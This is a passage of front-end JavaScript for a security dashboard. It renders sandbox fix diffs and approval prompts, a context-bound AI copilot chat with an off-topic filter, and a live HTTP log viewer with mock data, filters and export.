  const origEl = document.getElementById("diff-original");
  const modEl  = document.getElementById("diff-modified");
  origEl.textContent = "";
  modEl.textContent  = "";
  (job.diff.original || []).forEach(line => {
    const span = document.createElement("span");
    span.className = line.startsWith("-") ? "diff-line-removed" : "diff-line-ctx";
    span.textContent = line + "\n";
    origEl.appendChild(span);
  });
  (job.diff.modified || []).forEach(line => {
    const span = document.createElement("span");
    span.className = line.startsWith("+") ? "diff-line-added" : "diff-line-ctx";
    span.textContent = line + "\n";
    modEl.appendChild(span);
  });
}

function showTests(job) {
  const testsView = document.getElementById("sandbox-tests-view");
  testsView.style.display = "block";
  const testList = document.getElementById("sandbox-tests-list");
  testList.textContent = "";
  (job.tests || []).forEach(test => {
    const item     = document.createElement("div"); item.className = "test-item";
    const statusEl = document.createElement("span"); statusEl.className = "test-status " + test.status; statusEl.textContent = test.status === "pass" ? "✔" : "✖";
    const nameEl   = document.createElement("span"); nameEl.className = "test-name"; nameEl.textContent = test.name;
    const descEl   = document.createElement("span"); descEl.className = "test-desc"; descEl.textContent = test.desc;
    item.appendChild(statusEl); item.appendChild(nameEl); item.appendChild(descEl);
    testList.appendChild(item);
  });
}

// Close sandbox detail
const sandboxDetailClose = document.getElementById("sandbox-detail-close");
if (sandboxDetailClose) {
  sandboxDetailClose.addEventListener("click", () => {
    document.getElementById("sandbox-detail").style.display = "none";
    activeSandboxJob = null;
    _activeRealJobId = null;
    _activeDetailIsReal = false;
  });
}

// Cancel a running real Advanced AI job
const sandboxCancelBtn = document.getElementById("sandbox-cancel-btn");
if (sandboxCancelBtn) {
  sandboxCancelBtn.addEventListener("click", async () => {
    if (!_activeRealJobId) return;
    try {
      const res = await apiRequest(
        "/advanced-ai/jobs/" + _activeRealJobId + "/cancel",
        { method: "POST" }
      );
      if (!res.ok) { _showAuditStatus(await _apiErrorMessage(res), "error"); return; }
      _showAuditStatus("Cancellation requested \u2014 job stops at the next phase.", "info");
      openRealJobDetail(_activeRealJobId, true);
    } catch (err) {
      _showAuditStatus("Cancel failed: " + err.message, "error");
    }
  });
}

// New sandbox job — opens modal selector instead of redirecting to audit page
const newSandboxBtn = document.getElementById("new-sandbox-btn");
if (newSandboxBtn) {
  newSandboxBtn.addEventListener("click", () => openNewJobModal());
}

function openNewJobModal() {
  const listEl = document.getElementById("new-job-audit-list");
  if (!listEl) return;
  listEl.textContent = "";

  // Real backend mode: list completed audits from history
  if (API_CONFIG.USE_REAL_API) {
    _fillNewJobModalFromAPI(listEl);
    return;
  }

  MOCK_DATA.audits.forEach(audit => {
    const btn = document.createElement("button");
    btn.className = "new-job-audit-item";

    const counts = { critical: 0, high: 0, medium: 0 };
    (audit.findings || []).forEach(f => {
      const sev = (f.severity || "").toLowerCase();
      if (sev === "critical") counts.critical++;
      else if (sev === "high") counts.high++;
      else if (sev === "medium") counts.medium++;
    });
    const chips = Object.entries(counts).filter(([,v]) => v > 0)
      .map(([k, v]) => `<span class="finding-chip ${k}">${k.charAt(0).toUpperCase()+k.slice(1)}: ${v}</span>`)
      .join(" ");

    // Guard: normalize field access for both mock and API-shaped audits
    const auditLabel = audit.audit_id || audit.display_id || "—";
    const auditTarget = audit.target || audit.app_name || "—";
    const auditScanType = (audit.scan_type || "quick").charAt(0).toUpperCase() + (audit.scan_type || "quick").slice(1);
    const auditFiles = audit.files_scanned != null ? audit.files_scanned : "—";
    const auditCreated = (audit.created || audit.created_at || "").slice(0, 10) || "—";

    btn.innerHTML = `
      <div class="new-job-audit-header">
        <strong></strong>
        <span class="muted-badge"></span>
      </div>
      <div style="font-size:12px;color:#6b7280;margin-bottom:8px"></div>
      <div class="audit-card-findings">${chips || '<span style="color:#4b5563;font-size:11px">No actionable findings</span>'}</div>
    `;
    btn.querySelector(".new-job-audit-header strong").textContent = auditLabel;
    btn.querySelector(".muted-badge").textContent = auditTarget;
    btn.querySelector("div[style]").textContent =
      auditScanType + " Scan · " + auditFiles + " files · " + auditCreated;

    btn.addEventListener("click", () => {
      closeModal("new-job-modal");
      sendAuditToBeta(audit);
    });
    listEl.appendChild(btn);
  });

  document.getElementById("new-job-modal").classList.add("open");
}

/**
 * Real backend mode: list completed audits (from history) so an
 * analyst can start a real Advanced AI validation job from any of them.
 */
async function _fillNewJobModalFromAPI(listEl) {
  const loading = document.createElement("p");
  loading.style.cssText = "color:#6b7280;font-size:13px;padding:12px 8px";
  loading.textContent = "Loading completed audits\u2026";
  listEl.appendChild(loading);
  document.getElementById("new-job-modal").classList.add("open");

  let audits = [];
  try {
    const resp = await apiRequest("/history");
    if (resp.ok) {
      const data = await resp.json();
      const auditEntries = (data.entries || []).filter(e => e.entry_type === "audit");
      const fetches = auditEntries.slice(0, 10).map(entry =>
        apiRequest("/audit/" + entry.internal_id)
          .then(r => r.ok ? r.json() : null)
          .catch(() => null)
      );
      audits = (await Promise.all(fetches)).filter(Boolean)
        .filter(a => a.status === "complete" && (a.findings || []).length > 0)
        .map(_normalizeApiAudit);
    }
  } catch (_) { /* network error — empty state shown below */ }

  listEl.textContent = "";
  if (audits.length === 0) {
    const empty = document.createElement("p");
    empty.style.cssText = "color:#4b5563;font-size:13px;padding:12px 8px";
    empty.textContent = "No completed audits with findings yet. Run an audit first, then send it here.";
    listEl.appendChild(empty);
    return;
  }

  audits.forEach(audit => {
    const btn = document.createElement("button");
    btn.className = "new-job-audit-item";
    const counts = { critical: 0, high: 0, medium: 0 };
    (audit.findings || []).forEach(f => {
      const sev = (f.severity || "").toLowerCase();
      if (sev === "critical") counts.critical++;
      else if (sev === "high") counts.high++;
      else if (sev === "medium") counts.medium++;
    });
    const chips = Object.entries(counts).filter(([, v]) => v > 0)
      .map(([k, v]) => `<span class=\"finding-chip ${k}\">${k.charAt(0).toUpperCase() + k.slice(1)}: ${v}</span>`)
      .join(" ");
    btn.innerHTML = `
      <div class="new-job-audit-header">
        <strong></strong>
        <span class="muted-badge"></span>
      </div>
      <div class="audit-card-findings" style="margin-top:6px">${chips || '<span style="color:#4b5563;font-size:11px">No actionable findings</span>'}</div>
    `;
    btn.querySelector("strong").textContent = audit.display_id || audit.audit_id;
    btn.querySelector(".muted-badge").textContent = audit.app_name || audit.target || "\u2014";
    btn.addEventListener("click", () => {
      closeModal("new-job-modal");
      sendAuditToBeta(audit);
    });
    listEl.appendChild(btn);
  });
}

// Approval buttons — "Review Changes" removed; only Accept and Reject remain
const approveBtn = document.getElementById("sandbox-approve-btn");
const rejectBtn  = document.getElementById("sandbox-reject-btn");

function showApprovalConfirm(action) {
  pendingApprovalAction = action;
  const confirmText = document.getElementById("approval-confirm-text");
  if (confirmText) {
    confirmText.textContent = "";
    if (action === "approve") {
      const p1 = document.createElement("strong"); p1.textContent = "Accept this remediation?";
      const p2 = document.createElement("p");
      p2.style.cssText = "margin-top:8px;color:#9ca3af;font-size:12px";
      p2.textContent = "This will accept the proposed fix for the isolated sandbox workflow. The fix has NOT been applied to production. Production remains unchanged.";
      confirmText.appendChild(p1); confirmText.appendChild(p2);
    } else {
      const p1 = document.createElement("strong"); p1.textContent = "Reject this remediation?";
      const p2 = document.createElement("p");
      p2.style.cssText = "margin-top:8px;color:#9ca3af;font-size:12px";
      p2.textContent = "The proposed fix will not be accepted. The sandbox job will be discarded.";
      confirmText.appendChild(p1); confirmText.appendChild(p2);
    }
  }
  document.getElementById("approval-confirm-area").style.display = "block";
  if (typeof anime !== "undefined") {
    anime({ targets: "#approval-confirm-area", opacity: [0, 1], translateY: [-6, 0], duration: 200, easing: "easeOutQuad" });
  }
}

if (approveBtn) approveBtn.addEventListener("click", () => showApprovalConfirm("approve"));
if (rejectBtn)  rejectBtn.addEventListener("click",  () => showApprovalConfirm("reject"));

const confirmYes = document.getElementById("confirm-approval-yes");
const confirmNo  = document.getElementById("confirm-approval-no");
if (confirmYes) {
  confirmYes.addEventListener("click", async () => {
    if (!activeSandboxJob && !_activeDetailIsReal) return;
    if (!pendingApprovalAction) return;
    // Real backend mode: call approve/reject API
    if (_activeDetailIsReal && _activeRealJobId) {
      await _handleRealApproval(pendingApprovalAction);
      document.getElementById("approval-confirm-area").style.display = "none";
      pendingApprovalAction = null;
      return;
    }
    activeSandboxJob.approval_status = pendingApprovalAction === "approve" ? "approved" : "rejected";
    document.getElementById("approval-confirm-area").style.display = "none";
    document.getElementById("sandbox-approval-area").style.display = "none";
    renderSandboxJobs();
    const banner = document.createElement("div");
    banner.style.cssText = "padding:11px 14px;border-radius:5px;margin-top:14px;font-size:13px;font-weight:600;";
    if (pendingApprovalAction === "approve") {
      banner.style.cssText += ";background:var(--success-bg);border:1px solid var(--success-border);color:var(--success)";
      banner.textContent = "✔ Fix approved. Changes logged for deployment review.";
    } else {
      banner.style.cssText += ";background:var(--danger-bg);border:1px solid var(--danger-border);color:var(--danger)";
      banner.textContent = "✖ Fix rejected. Sandbox discarded.";
    }
    document.getElementById("sandbox-tests-view").insertAdjacentElement("afterend", banner);
    pendingApprovalAction = null;
  });
}
if (confirmNo) {
  confirmNo.addEventListener("click", () => {
    document.getElementById("approval-confirm-area").style.display = "none";
    pendingApprovalAction = null;
  });
}

// Retry / Discard
const retryBtn   = document.getElementById("sandbox-retry-btn");
const discardBtn = document.getElementById("sandbox-discard-btn");
if (retryBtn) {
  retryBtn.addEventListener("click", () => {
    if (!activeSandboxJob) return;
    activeSandboxJob.status = "running";
    activeSandboxJob.current_step = 2;
    openSandboxDetail(activeSandboxJob);
  });
}
if (discardBtn) {
  discardBtn.addEventListener("click", () => {
    if (!activeSandboxJob) return;
    MOCK_DATA.sandbox_jobs = MOCK_DATA.sandbox_jobs.filter(j => j.id !== activeSandboxJob.id);
    document.getElementById("sandbox-detail").style.display = "none";
    activeSandboxJob = null;
    renderSandboxJobs();
  });
}

// =====================================================================
//  AI COPILOT
//  Context MUST be selected before asking questions.
//  In API mode: sends to POST /copilot/ask with context_type + context_id.
//  The backend enforces the context boundary and refuses off-topic questions.
//  In mock mode: uses a simple context-aware response generator.
// =====================================================================
function updateCopilotContext() {
  const card = document.getElementById("copilot-context-card");
  const body = document.getElementById("copilot-context-body");
  const noCtxBanner = document.getElementById("copilot-no-context-banner");

  if (!copilotContext || !card || !body) {
    if (noCtxBanner) noCtxBanner.style.display = "block";
    if (card) card.style.display = "none";
    return;
  }
  if (noCtxBanner) noCtxBanner.style.display = "none";
  body.textContent = "";
  card.style.display = "block";

  const d = copilotContext.data || {};
  const pairs = copilotContext.type === "investigation"
    ? [
        ["Investigation", d.display_id || copilotContext.id || "—"],
        ["Event Type",    d.type       || "—"],
        ["Severity",      d.severity   || "—"],
        ["Source IP",     d.source_ip  || "—"],
        ["Trigger Score",    (d.risk_score != null ? d.risk_score + " / 6" : "—")],
      ]
    : [
        ["Audit ID",  d.audit_id  || copilotContext.id || "—"],
        ["App",       d.app_name  || "—"],
        ["Status",    d.status    || "—"],
        ["Findings",  String((d.findings || []).length)],
      ];

  pairs.forEach(([label, val]) => {
    const row = document.createElement("div"); row.className = "context-row";
    const s   = document.createElement("span"); s.textContent = label;
    const st  = document.createElement("strong"); st.textContent = val;
    row.appendChild(s); row.appendChild(st);
    body.appendChild(row);
  });
}

const copilotInput    = document.getElementById("copilot-input");
const copilotSend     = document.getElementById("copilot-send");
const copilotMessages = document.getElementById("copilot-messages");

function addChatMessage(message, sender) {
  const el = document.createElement("div");
  el.className = "chat-message " + (sender === "user" ? "user-message" : "ai-message");
  if (sender === "ai") {
    const avatar  = document.createElement("div"); avatar.className = "message-avatar"; avatar.textContent = "🤖";
    const content = document.createElement("div"); content.className = "message-content";
    const name    = document.createElement("strong"); name.textContent = "Sentra AI";
    const text    = document.createElement("p"); text.textContent = message;
    content.appendChild(name); content.appendChild(text);
    el.appendChild(avatar); el.appendChild(content);
  } else {
    const content = document.createElement("div"); content.className = "message-content";
    const name    = document.createElement("strong"); name.textContent = "You";
    const text    = document.createElement("p"); text.textContent = message;
    content.appendChild(name); content.appendChild(text);
    el.appendChild(content);
  }
  copilotMessages.appendChild(el);
  copilotMessages.scrollTop = copilotMessages.scrollHeight;
  return el;
}

/**
 * Mock response generator — context-aware, refuses off-topic questions.
 */
function _mockCopilotResponse(message) {
  const q = message.toLowerCase();
  if (!copilotContext) {
    return "Please select a security investigation or audit from the SOC or Audit page before asking questions.";
  }
  const d = copilotContext.data || {};
  const securityKeywords = [
    "sql", "inject", "brute", "force", "xss", "ddos", "scan", "port",
    "critical", "high", "medium", "low", "severity", "confidence", "risk",
    "attack", "threat", "finding", "audit", "investigation", "cwe", "owasp",
    "analyze", "explain", "summarize", "review", "why", "how", "what", "is",
    "log", "ip", "endpoint", "source", "event", "detection", "alert"
  ];
  const isRelated = securityKeywords.some(kw => q.includes(kw));
  if (!isRelated) {
    return "I can only answer questions about the selected Sentra security event or investigation. Please ask about the security context shown on the left.";
  }
  if (q.includes("why") && (q.includes("critical") || q.includes("high") || q.includes("severe"))) {
    return "The investigation was classified as " + (d.severity || "unknown") + " severity. The behavioural trigger score was " + (d.risk_score || "?") + "/6, which reflects how many heuristic signals fired (high volume, error rate, path scanning, etc.). " + (d.analysis || "See the analysis field for details.");
  }
  if (q.includes("recommend") || q.includes("action") || q.includes("fix") || q.includes("mitigat")) {
    const actions = d.actions || [];
    return actions.length > 0
      ? "Recommended actions:\n" + actions.map((a, i) => (i+1) + ". " + a).join("\n")
      : "No specific actions were recorded for this investigation.";
  }
  if (q.includes("explain") || q.includes("summarize") || q.includes("what")) {
    return (d.analysis || "No AI analysis is available yet for this investigation.");
  }
  return "Based on the selected context (Investigation " + (d.display_id || "—") + "): " + (d.analysis || "Analysis pending.");
}

async function sendCopilotMessage() {
  if (!copilotInput) return;
  const message = copilotInput.value.trim();
  if (!message) return;

  // ENFORCE: require context before allowing questions
  if (!copilotContext) {
    addChatMessage(message, "user");
    copilotInput.value = "";
    addChatMessage(
      "Please select a security investigation or audit first. Open any investigation from the SOC page, or an audit from the Audit page, then use the 'Ask AI Copilot' button to bring context here.",
      "ai"
    );
    return;
  }

  addChatMessage(message, "user");
  copilotInput.value = "";
  const thinking = addChatMessage("Analyzing…", "ai");

  // API mode with real context id: call backend
  if (API_CONFIG.USE_REAL_API && copilotContext.id && !copilotContext._mock) {
    try {
      const resp = await apiRequest("/copilot/ask", {
        method: "POST",
        body: JSON.stringify({
          context_type: copilotContext.type,
          context_id:   copilotContext.id,
          question:     message,
        }),
      });
      thinking.remove();
      if (resp.ok) {
        const data = await resp.json();
        addChatMessage(data.answer, "ai");
      } else if (resp.status === 404) {
        addChatMessage("The selected security context could not be found on the server. It may have been cleared. Please re-select an investigation or audit.", "ai");
      } else {
        const errMsg = await _apiErrorMessage(resp);
        addChatMessage("Copilot error: " + errMsg, "ai");
      }
    } catch (err) {
      thinking.remove();
      if (err.status !== 401) {
        addChatMessage("Copilot is unavailable: " + (err.message || "network error"), "ai");
      }
    }
  } else {
    // Mock mode or no backend id: use local response generator
    setTimeout(() => {
      thinking.remove();
      addChatMessage(_mockCopilotResponse(message), "ai");
    }, 700);
  }
}

if (copilotSend) copilotSend.addEventListener("click", sendCopilotMessage);
if (copilotInput) copilotInput.addEventListener("keydown", e => { if (e.key === "Enter") sendCopilotMessage(); });

document.querySelectorAll(".quick-action").forEach(btn => {
  btn.addEventListener("click", () => {
    if (!copilotContext) {
      addChatMessage("Please select a security investigation or audit from the SOC or Audit page first.", "ai");
      return;
    }
    const action = btn.dataset.action;
    const prompts = {
      "analyze-event":   "Analyze this security event and explain what happened",
      "explain-finding": copilotContext.type === "audit"
        ? "Explain the most critical finding in this audit"
        : "Explain the security event and what the attacker likely intended",
      "summarize":       "Summarize this investigation — what triggered it and what was found?",
      "explain-cwe":     copilotContext.type === "audit"
        ? "What CWE vulnerabilities were found in this audit and how severe are they?"
        : "What type of attack does this investigation suggest based on the logs?",
      "review-audit":    "Review the findings in this audit and prioritize which to fix first"
    };
    const prompt = prompts[action] || "Summarize the security context";
    if (copilotInput) { copilotInput.value = prompt; }
    sendCopilotMessage();
  });
});

// =====================================================================
//  MODAL CLOSE LOGIC
// =====================================================================
function closeModal(modalId) {
  const modal = document.getElementById(modalId);
  if (modal) modal.classList.remove("open");
}

document.addEventListener("click", e => {
  const closeBtn = e.target.closest(".modal-close");
  if (closeBtn) { closeModal(closeBtn.dataset.modal); return; }
  if (e.target.classList.contains("modal-overlay")) e.target.classList.remove("open");
});

// =====================================================================
//  LIVE LOGS
//  Uses GET /logs/list (API mode) or MOCK_DATA.live_logs (mock mode).
//  Live updates every 5 seconds when not paused.
//  Export uses GET /logs/export (API mode) or local filter+download (mock mode).
// =====================================================================
(function initLiveLogs() {

  // ── State ──────────────────────────────────────────────────────────
  let _llPaused    = false;
  let _llInterval  = null;
  let _llAllLogs   = [];  // all logs currently held (newest-first)
  const _LL_POLL_MS = 5000;
  const _LL_MAX_DISPLAY = 500;

  // ── Mock logs data ─────────────────────────────────────────────────
  // Reuses the schema that the real backend produces.
  MOCK_DATA.live_logs = (function _buildMockLogs() {
    const methods  = ["GET", "POST", "GET", "GET", "POST", "PUT", "DELETE", "PATCH"];
    const paths    = [
      "/api/users", "/api/login", "/api/products", "/admin", "/api/orders",
      "/auth/token", "/api/inventory", "/api/settings", "/login", "/dashboard"
    ];
    const statuses = [200, 200, 200, 201, 204, 301, 400, 401, 403, 404, 500, 503];
    const ips      = ["192.168.1.10","10.0.0.31","172.16.0.45","192.168.1.55","10.0.0.72"];
    const uas      = [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "curl/7.88.1",
      "python-requests/2.28.0",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    ];
    const etypes   = ["api", "api", "login", "web_request", "web_request", "suspicious", "error"];
    const logs = [];
    const now = Date.now();
    for (let i = 0; i < 60; i++) {
      const method = methods[i % methods.length];
      const status = statuses[i % statuses.length];
      const etype  = etypes[i % etypes.length];
      logs.push({
        log_id:      "mock-" + i,
        ingested_at: new Date(now - i * 4000).toISOString(),
        timestamp:   new Date(now - i * 4000).toISOString(),
        source_ip:   ips[i % ips.length],
        method,
        path:        paths[i % paths.length],
        status,
        user_agent:  uas[i % uas.length],
        event_type:  etype,
      });
    }
    return logs; // already newest-first
  })();

  // ── DOM refs ───────────────────────────────────────────────────────
  const llBody       = () => document.getElementById("ll-log-body");
  const llEmptyMsg   = () => document.getElementById("ll-empty-msg");
  const llCountBadge = () => document.getElementById("ll-count-badge");
  const llLiveInd    = () => document.getElementById("ll-live-indicator");
  const llPauseBtn   = () => document.getElementById("ll-pause-btn");
  const llExportBtn  = () => document.getElementById("ll-export-btn");

  // ── Filter helpers ─────────────────────────────────────────────────
  function _getFilters() {
    return {
      event_type: (document.getElementById("ll-filter-event")?.value  || "").trim(),
      method:     (document.getElementById("ll-filter-method")?.value || "").trim(),
      status:     (document.getElementById("ll-filter-status")?.value || "").trim(),
      search:     (document.getElementById("ll-filter-search")?.value || "").trim().toLowerCase(),
    };
  }

  function _matchesStatus(code, range) {
    const c = parseInt(code, 10);
    if (isNaN(c)) return false;
    if (range === "2xx") return c >= 200 && c < 300;
    if (range === "3xx") return c >= 300 && c < 400;
    if (range === "4xx") return c >= 400 && c < 500;
    if (range === "5xx") return c >= 500;
    return true; // "" = All
  }

  function _applyFilters(logs) {
    const f = _getFilters();
    return logs.filter(l => {
      if (f.event_type && !String(l.event_type || "").toLowerCase().includes(f.event_type)) return false;
      if (f.method    && String(l.method   || "").toUpperCase() !== f.method.toUpperCase()) return false;
      if (f.status    && !_matchesStatus(l.status, f.status)) return false;
      if (f.search) {
        const hay = [l.source_ip, l.path, l.user_agent, l.event_type].map(v => String(v||"").toLowerCase()).join(" ");
        if (!hay.includes(f.search)) return false;
      }
      return true;
    });
  }

  // ── Status helpers ─────────────────────────────────────────────────
  function _statusClass(code) {
    const c = parseInt(code, 10);
    if (c >= 200 && c < 300) return "s2xx";
    if (c >= 300 && c < 400) return "s3xx";
    if (c >= 400 && c < 500) return "s4xx";
    if (c >= 500)             return "s5xx";
    return "";
  }

  function _methodClass(m) {
    switch ((m||"").toUpperCase()) {
      case "GET":    return "m-get";
      case "POST":   return "m-post";
      case "PUT":    return "m-put";
      case "PATCH":  return "m-patch";
      case "DELETE": return "m-delete";
      default:       return "";
    }
  }

  function _etypeClass(et) {
    const e = (et||"").toLowerCase();
    if (e.includes("suspicious")) return "suspicious";
    if (e.includes("error"))      return "error";
    if (e.includes("login"))      return "login";
    if (e.includes("api"))        return "api";
    return "";
  }

  function _rowClass(log) {
    const c = parseInt(log.status, 10);
    if (c >= 500) return "ll-error";
    if (c >= 400) return "ll-warn";
    return "ll-success";
  }

  function _formatTs(raw) {
    if (!raw) return "—";
    try {
      const d = new Date(raw);
      return d.toLocaleTimeString("en-GB", { hour12: false }) + "." +
             String(d.getMilliseconds()).padStart(3, "0");
    } catch (_) { return raw; }
  }

  // ── Render ─────────────────────────────────────────────────────────
  function _renderLogs() {
    const body = llBody();
    if (!body) return;

    const filtered = _applyFilters(_llAllLogs).slice(0, _LL_MAX_DISPLAY);
    const count    = filtered.length;

    const badge = llCountBadge();
    if (badge) badge.textContent = count + " Log" + (count !== 1 ? "s" : "");

    const emptyMsg = llEmptyMsg();
    if (count === 0) {
      body.innerHTML  = "";
      if (emptyMsg) emptyMsg.style.display = "block";
      return;
    }
    if (emptyMsg) emptyMsg.style.display = "none";

    // Batch DOM update: build fragment
    const frag = document.createDocumentFragment();
    filtered.forEach(log => {
      const row = document.createElement("div");
      row.className = "ll-row ll-log-row " + _rowClass(log);

      const ts = document.createElement("span");
      ts.className = "ll-ts";
      ts.textContent = _formatTs(log.ingested_at || log.timestamp);

      const ip = document.createElement("span");
      ip.className = "ll-ip";
      ip.textContent = log.source_ip || "—";

      const method = document.createElement("span");
      method.className = "ll-method " + _methodClass(log.method);
      method.textContent = log.method || "—";

      const path = document.createElement("span");
      path.className = "ll-path";
      path.title = log.path || "";
      path.textContent = log.path || "—";

      const stat = document.createElement("span");
      stat.className = "ll-status " + _statusClass(log.status);
      stat.textContent = log.status ?? "—";

      const etype = document.createElement("span");
      const etBadge = document.createElement("span");
      etBadge.className = "ll-etype " + _etypeClass(log.event_type);
      etBadge.textContent = log.event_type || "—";
      etype.appendChild(etBadge);

      const ua = document.createElement("span");
      ua.className = "ll-ua";
      ua.title = log.user_agent || "";
      ua.textContent = log.user_agent || "—";

      [ts, ip, method, path, stat, etype, ua].forEach(c => row.appendChild(c));
      frag.appendChild(row);
    });

    body.textContent = "";
    body.appendChild(frag);
  }

  // ── Fetch (API mode) ───────────────────────────────────────────────
  async function _fetchLogs() {
    const f = _getFilters();
    const params = new URLSearchParams({ limit: "500" });
    if (f.event_type) params.set("event_type", f.event_type);
    if (f.method)     params.set("method",     f.method);
    if (f.status)     params.set("status",     f.status);
    if (f.search)     params.set("search",     f.search);

    try {
      const resp = await apiRequest("/logs/list?" + params.toString());
      if (!resp.ok) {
        console.warn("[LiveLogs] fetch failed:", resp.status);
        return;
      }
      const data = await resp.json();
      _llAllLogs = data.logs || [];
      _renderLogs();
    } catch (err) {
      if (!err.status) console.warn("[LiveLogs] network error:", err.message);
    }
  }

  // ── Mock "fetch" (mock mode) ───────────────────────────────────────
  function _mockFetch() {
    // Simulate a new log arriving occasionally
    if (Math.random() < 0.5) {
      const methods  = ["GET","POST","GET","POST","DELETE","PUT"];
      const paths    = ["/api/users","/api/login","/api/products","/admin","/api/data"];
      const statuses = [200, 200, 201, 401, 403, 404, 500];
      const ips      = ["192.168.1.10","10.0.0.31","172.16.0.45","192.168.1.55"];
      const uas      = ["Mozilla/5.0 (Windows NT 10.0)","curl/7.88.1","python-requests/2.28.0"];
      const etypes   = ["api","login","web_request","suspicious","error"];
      const m = methods[Math.floor(Math.random() * methods.length)];
      const s = statuses[Math.floor(Math.random() * statuses.length)];
      const newLog = {
        log_id:      "mock-live-" + Date.now(),
        ingested_at: new Date().toISOString(),
        timestamp:   new Date().toISOString(),
        source_ip:   ips[Math.floor(Math.random() * ips.length)],
        method:      m,
        path:        paths[Math.floor(Math.random() * paths.length)],
        status:      s,
        user_agent:  uas[Math.floor(Math.random() * uas.length)],
        event_type:  etypes[Math.floor(Math.random() * etypes.length)],
      };
      MOCK_DATA.live_logs.unshift(newLog);
      if (MOCK_DATA.live_logs.length > 500) MOCK_DATA.live_logs.pop();
    }
    _llAllLogs = MOCK_DATA.live_logs.slice();
    _renderLogs();
  }

  // ── Poll controller ────────────────────────────────────────────────
  function _startPolling() {
    if (_llInterval) return;
    _llInterval = setInterval(() => {
      if (_llPaused) return;
      if (API_CONFIG.USE_REAL_API) { _fetchLogs(); } else { _mockFetch(); }
    }, _LL_POLL_MS);
  }

  function _stopPolling() {
    if (_llInterval) { clearInterval(_llInterval); _llInterval = null; }
  }

  // ── Pause / resume ─────────────────────────────────────────────────
  function _setPaused(paused) {
    _llPaused = paused;
    const pauseBtn = llPauseBtn();
    const liveInd  = llLiveInd();
    if (paused) {
      if (pauseBtn) pauseBtn.textContent = "▶ Resume";
      if (liveInd) {
        liveInd.innerHTML = '<span class="ll-paused-badge">⏸ PAUSED</span>';
        liveInd.className = "";
      }
    } else {
      if (pauseBtn) pauseBtn.textContent = "⏸ Pause";
      if (liveInd) {
        liveInd.innerHTML = '<span class="live-dot"></span> LIVE';
        liveInd.className = "live-status";
      }
      // Immediately refresh on resume
      if (API_CONFIG.USE_REAL_API) { _fetchLogs(); } else { _mockFetch(); }
    }
  }

  // ── Export ─────────────────────────────────────────────────────────
  let _exportPreset = "15m"; // default

  function _openExportModal() {
    const modal = document.getElementById("ll-export-modal");
    if (!modal) return;

    // Update the filter-note
    const note = document.getElementById("ll-export-filter-note");
    if (note) {
      const f = _getFilters();
      const active = [];
      if (f.event_type) active.push("Event Type: " + f.event_type);
      if (f.method)     active.push("Method: "     + f.method);
      if (f.status)     active.push("Status: "     + f.status);
      if (f.search)     active.push("Search: \""   + f.search + "\"");
      note.textContent = active.length
        ? "Active filters will be applied: " + active.join(" · ")
        : "No filters active — all logs in timeframe will be exported.";
    }

    modal.classList.add("open");
  }

  function _getExportTimeframe() {
    const now = new Date();
    if (_exportPreset === "custom") {
      const fromEl = document.getElementById("ll-export-from");
      const toEl   = document.getElementById("ll-export-to");
      return {
        from: fromEl?.value ? new Date(fromEl.value).toISOString() : null,
        to:   toEl?.value   ? new Date(toEl.value).toISOString()   : null,
      };
    }
    const minutes = { "15m": 15, "1h": 60, "6h": 360, "24h": 1440 };
    const mins = minutes[_exportPreset] || 15;
    return {
      from: new Date(now.getTime() - mins * 60 * 1000).toISOString(),
      to:   now.toISOString(),
    };
  }

  async function _doExport() {
    const fmt = document.querySelector('input[name="ll-export-fmt"]:checked')?.value || "json";
    const tf  = _getExportTimeframe();
    const f   = _getFilters();

    if (!API_CONFIG.USE_REAL_API) {
      // Mock export: filter MOCK_DATA.live_logs locally
      _mockExport(fmt, tf, f);
      closeModal("ll-export-modal");
      return;
    }

    // API mode: build URL and trigger download
    const params = new URLSearchParams({ format: fmt });
    if (tf.from)      params.set("from",       tf.from);
    if (tf.to)        params.set("to",         tf.to);
    if (f.event_type) params.set("event_type", f.event_type);
    if (f.method)     params.set("method",     f.method);
    if (f.status)     params.set("status",     f.status);
    if (f.search)     params.set("search",     f.search);

    try {
      const resp = await apiRequest("/logs/export?" + params.toString());
      if (!resp.ok) {
        const msg = await _apiErrorMessage(resp);
        _showAuditStatus("Export failed: " + msg, "error");
        return;
      }
      const blob = await resp.blob();
      const url  = URL.createObjectURL(blob);
      const a    = document.createElement("a");
      a.href     = url;
      a.download = "logs_export." + fmt;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      closeModal("ll-export-modal");
      _showAuditStatus("Export downloaded.", "success");
    } catch (err) {
      if (!err.status) _showAuditStatus("Export failed: " + err.message, "error");
    }
  }

  function _mockExport(fmt, tf, f) {
    // Filter mock logs by timeframe + fields
    const fromTs = tf.from ? new Date(tf.from).getTime() : null;
    const toTs   = tf.to   ? new Date(tf.to).getTime()   : null;

    let logs = MOCK_DATA.live_logs.filter(l => {
      const t = new Date(l.ingested_at || l.timestamp).getTime();
      if (fromTs && t < fromTs) return false;
      if (toTs   && t > toTs)   return false;
      if (f.event_type && !String(l.event_type||"").toLowerCase().includes(f.event_type)) return false;
      if (f.method    && String(l.method||"").toUpperCase() !== f.method.toUpperCase()) return false;
      if (f.status    && !_matchesStatus(l.status, f.status)) return false;
      if (f.search) {
        const hay = [l.source_ip, l.path, l.user_agent, l.event_type].map(v=>String(v||"").toLowerCase()).join(" ");
        if (!hay.includes(f.search)) return false;
      }
      return true;
    });

    let content, type, filename;
    if (fmt === "csv") {
      const fields = ["log_id","ingested_at","timestamp","source_ip","method","path","status","user_agent","event_type"];
      const rows = [fields.join(",")];
      logs.forEach(l => rows.push(fields.map(k => JSON.stringify(String(l[k]||""))).join(",")));
      content  = rows.join("\n");
      type     = "text/csv";
      filename = "logs_export.csv";
    } else {
      content  = JSON.stringify({ count: logs.length, logs }, null, 2);
      type     = "application/json";
      filename = "logs_export.json";
    }

    const blob = new Blob([content], { type });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement("a");
    a.href = url; a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    _showAuditStatus("Export downloaded (" + logs.length + " logs).", "success");
  }

  // ── Wire up controls ───────────────────────────────────────────────
  document.addEventListener("DOMContentLoaded", () => {
    // Pause/resume button
    const pauseBtn = llPauseBtn();
    if (pauseBtn) {
      pauseBtn.addEventListener("click", () => _setPaused(!_llPaused));
    }

    // Export button
    const exportBtn = llExportBtn();
    if (exportBtn) {
      exportBtn.addEventListener("click", _openExportModal);
